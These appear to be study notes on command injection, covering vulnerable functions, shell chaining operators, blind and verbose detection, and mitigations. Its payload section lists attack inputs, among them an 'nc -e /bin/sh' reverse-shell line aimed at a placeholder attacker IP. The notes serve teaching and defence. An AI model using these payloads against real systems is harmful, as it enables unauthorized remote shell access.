# Command Injection
# Command Injection Notes

## 1. Overview

**Command Injection** (also known as **Remote Code Execution – RCE**) is a vulnerability where an attacker abuses an application's behavior to execute **arbitrary commands** on the host **operating system**.

### Impact
- Commands execute with the **same privileges as the application**
- Example:  
  If the application runs as user `joe`, the attacker gains `joe`’s permissions

### Risk
Attackers can:
- Read **sensitive files**
- Modify or delete data
- Gain a **persistent foothold** on the server

---

## 2. Discovery and Root Cause

This vulnerability occurs when **user-supplied input** is passed to **system-level commands** without proper validation or sanitization.

### Common Vulnerable Scenarios

- **PHP**
  - `exec()`
  - `passthru()`
  - `system()`

- **Python**
  - `subprocess` module (especially with `shell=True`)

- **Node.js**
  - `child_process`

### Example Vulnerable Logic

```bash
grep "$title" songtitles.txt
```

---

## 3. Exploitation Methods

Attackers use **shell operators** to chain or control command execution.

### Common Shell Operators

- `;` **Semicolon**  
  Executes multiple commands sequentially

- `&` **Ampersand**  
  Runs commands in the background

- `&&` **Double Ampersand**  
  Executes the second command **only if** the first succeeds

- `|` **Pipe**  
  Passes output from one command to another

---

## Detection Types

| Method  | Description                       | Testing Strategy                                   |
|-------|-----------------------------------|--------------------------------------------------|
| Verbose | Output visible on the web page   | Run `whoami` or `ls` and observe the response    |
| Blind   | No output shown                 | Use time-based payloads (`sleep`) or redirection |

---

## 4. Useful Payloads

### Linux Payloads

- `whoami`  
  Display current user

- `ls`  
  List directory contents

- `ping -c 10 [IP]`  
  Causes a ~10 second delay (blind injection)

- `sleep [seconds]`  
  Forces the application to hang

- `nc -e /bin/sh [IP] [PORT]`  
  Spawn a reverse shell

---

### Windows Payloads

- `whoami`  
  Display current user

- `dir`  
  List directory contents

- `ping -n 10 127.0.0.1`  
  Causes a delay

- `timeout [seconds]`  
  Forces the application to hang

---

## 5. Mitigation and Prevention

### Input Sanitization

Cleaning user input by:
- Removing special characters (`;`, `&`, `|`)
- Enforcing strict formats (e.g., numbers only)

---

### Security Best Practices

- **Avoid Dangerous Functions**
- **Use Built-in APIs**
- **Input Validation (Allow-listing)**
- **Filtering** (e.g., `filter_input()` in PHP)

---
